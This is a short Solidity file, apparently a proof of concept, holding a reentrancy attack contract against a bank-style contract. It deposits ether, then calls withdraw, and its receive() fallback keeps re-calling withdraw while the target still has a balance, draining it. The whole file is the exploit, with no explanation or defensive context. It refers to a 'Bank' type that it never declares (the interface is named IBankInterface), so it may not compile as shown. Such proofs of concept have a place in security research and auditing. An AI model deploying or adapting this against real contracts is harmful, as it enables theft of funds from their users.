interface IBankInterface {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    Bank internal vulnerable;
    address internal owner;

    constructor(address _vulnerable) {
        vulnerable = Bank(_vulnerable);
        owner = msg.sender;
    }

    function prepareAttack() external payable {
        require(msg.value > 0);
        vulnerable.deposit{value: msg.value}();
    }

    function attack(uint withdrawAmount) external {
        require(msg.sender == owner);
        vulnerable.withdraw(withdrawAmount);
    }

    receive() external payable {
        _continueAttack(msg.value);
    }

    function _continueAttack(uint amount) internal {
        if (address(vulnerable).balance >= amount) {
            vulnerable.withdraw(amount);
        }
    }
}